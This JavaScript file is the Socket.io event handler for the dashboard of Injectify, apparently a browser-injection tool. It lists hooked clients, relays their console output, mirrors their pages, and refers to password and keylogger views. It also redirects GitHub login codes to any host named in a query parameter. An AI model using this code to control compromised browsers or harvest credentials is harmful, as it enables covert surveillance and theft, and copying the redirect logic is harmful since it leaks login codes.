import queryString from 'query-string'
import NProgress from 'nprogress'
import url from 'url'
import _ from 'lodash'
const query = queryString.parse(location.search)
const development = process.env.NODE_ENV == 'development' ? true : false

import * as Actions from '../actions'

/**
 * Socket.io handler
 */
export default (socket, store, history) => {
  const { dispatch } = store
  const state = () => {
    return store.getState().injectify
  }

  /**
   * Auto-login
   */
  if (query.code) {
    /**
     * Log in with GitHub callback
     */
    if (query.state && url.parse(query.state).hostname && window.location.hostname !== url.parse(query.state).hostname) {
      location = location.href.replace(window.location.origin, `${url.parse(query.state).protocol}/\/${url.parse(query.state).host}`)
    } else {
      socket.emit(`auth:github`, query)
      history.push(location.pathname.split('?')[0])
    }
  } else if (query.token) {
    /**
     * Log in with token query
     */
    socket.emit(`auth:github/token`, query.token)
    history.push(location.pathname.split('?')[0])
  } else if (state().accounts.length) {
    /**
     * Log in with last used account
     */
    let lastUsedAccount = _.maxBy(state().accounts, o => {
      return o.lastUsed
    }) || state().accounts[0]
    if (lastUsedAccount && lastUsedAccount.token) {
      socket.emit(`auth:github/token`, lastUsedAccount.token)
    }
  } else {
    setTimeout(() => {
      NProgress.done()
    }, 3000)
  }

  socket.on(`server:info`, server => {
    let {
      github,
      discord
    } = server
    NProgress.inc()
    dispatch(Actions.setServer(server))
    /**
     * Append widgetbot widget if the screen width is greater than 400
     */
    if ((window.innerWidth || document.body.clientWidth) > 400 && discord && discord.server && discord.channel) {
      let crate = document.createElement(`script`)
      crate.setAttribute(`src`, `https://crate.widgetbot.io/v2`)
      let config = discord
      /**
       * Don`t preload the widget on screens under 1000px or whilst in development
       *
       * Force-delayed
       */
      if (development || (window.innerWidth || document.body.clientWidth) < 1000) config.delay = true
      crate.innerHTML = `new Crate(${JSON.stringify(config)})`
      document.head.appendChild(crate)
    }
  })

  socket.on(`auth:github`, data => {
    if (data.success && data.token) {
      if (window.crate) {
        crate.config({
          username: `@${data.user.login}`
        })
      } else {
        let timer = setInterval(() => {
          if (window.crate) {
            clearInterval(timer)
            crate.config({
              username: `@${data.user.login}`
            })
          }
        }, 1000)
      }
      dispatch(Actions.authAccount(data.token, data.user))
    }
    // socket.emit(`project:read`, {
    //   project: decodeURIComponent(project),
    //   page: page
    // })
    console.log(`%c[websocket] ` + `%cauth:github =>`, `color: #ef5350`, `color:  #FF9800`, data)
    NProgress.inc()
  })

  socket.on(`auth:github/stale`, data => {
    console.log(`%c[websocket] ` + `%cauth:github/stale =>`, `color: #ef5350`, `color:  #FF9800`, data)
    dispatch(Actions.removeAccount({
      token: data.token
    }))
    NProgress.done()
  })

  socket.on(`user:projects`, data => {
    console.log(`%c[websocket] ` + `%cuser:projects =>`, `color: #ef5350`, `color:  #FF9800`, data)
    dispatch(Actions.setProjects(data))
    if (state().project.name && state().page) {
      socket.emit(`project:read`, {
        project: state().project.name,
        page: state().page
      })
    } else {
      NProgress.done()
    }
  })

  socket.on(`project:read`, data => {
    let { page, doc } = data
    console.log(`%c[websocket] ` + `%cproject:read =>`, `color: #ef5350`, `color:  #FF9800`, data)
    dispatch(Actions.setProject(data.doc, page))
    NProgress.done()
  })


  /**
   * Clients listener
   */
  socket.on(`inject:clients`, data => {
    console.log('%c[websocket] ' + '%cinject:clients =>', 'color: #ef5350', 'color:  #FF9800', data)
    let { event, session, clients, project } = data
    /**
     * Parse data
     */
    if (event == 'list') {
      dispatch(Actions.setClients(project, clients))
    } else {
      if (event == 'connect') {
        dispatch(Actions.addClient(project, session.token, session.data))
        /**
         * If they reconnect, re-select them
         */
        if (state().project.console.state.selected.token === session.token) {
          if (!state().project.console.state.selected.client) {
            socket.emit('inject:client', {
              project,
              client: session.token
            })
          }
          dispatch(Actions.selectClient(project, session.token))
        }
      }

      if (event == 'disconnect') {
        dispatch(Actions.removeClient(project, session.token, session.id))
      }
    }
  })

  /**
   * Client listener
   */
  socket.on(`inject:client`, client => {
    console.log('Client emitted an update', client)
    dispatch(Actions.updateClient(project, client))
  })

  /**
   * Console listener
   */
  socket.on(`inject:log`, (log) => {
    dispatch(Actions.log(log))

    let { type, message } = log
    if (type === 'return') {
      console.log.apply(this, message)
    } else {
      console[type].apply(this, message)
    }
  })

  /**
   * PageGhost
   */
  socket.on(`inject:pageghost`, data => {
    if (!window.pageGhost) window.pageGhost = {}
    if (window.pageGhost[data.sender.id]) {
      // if (data.dom) window.pageGhost[data.sender.id].dom = data.dom
      window.pageGhost[data.sender.id].win.postMessage(data, '*')
    }
  })


  // socket.on(`project:switch`, data => {
  //   console.log(`%c[websocket] ` + `%cproject:switch =>`, `color: #ef5350`, `color:  #FF9800`, data)

  //   let page = `overview`
  //   if (window.location.href.endsWith(`/passwords`)) page = `passwords`
  //   if (window.location.href.endsWith(`/keylogger`)) page = `keylogger`
  //   if (window.location.href.endsWith(`/inject`)) page = `inject`
  //   if (window.location.href.endsWith(`/config`)) page = `config`

  //   window.history.pushState(``, `${data.project} - Injectify`, `/projects/${encodeURIComponent(data.project)}/${page !== `overview` ? page : ``}`)
  //   socket.emit(`project:read`, {
  //     project: data.project,
  //     page: page
  //   })
  // })

  socket.on(`err`, error => {
    console.error(`%c[websocket] ` + `%cerr =>`, `color: #ef5350`, `color:  #FF9800`, error)
    this.setState({
      notify: error,
      notifyOpen: true
    })
    NProgress.done()
  })

  socket.on(`notify`, message => {
    console.log(`%c[websocket] ` + `%cnotify =>`, `color: #ef5350`, `color:  #FF9800`, message)
    this.notify(message)
  })

  socket.on(`disconnect`, () => {
    console.error(`%c[websocket] ` + `%cdisconnected =>`, `color: #ef5350`, `color:  #FF9800`, `abruptly disconnected`)
    this.setState({
      notify: {
        title: `Connectivity issues`,
        message: `Disconnected from server`,
        id: `reconnect`
      },
      notifyOpen: true
    })
  })
}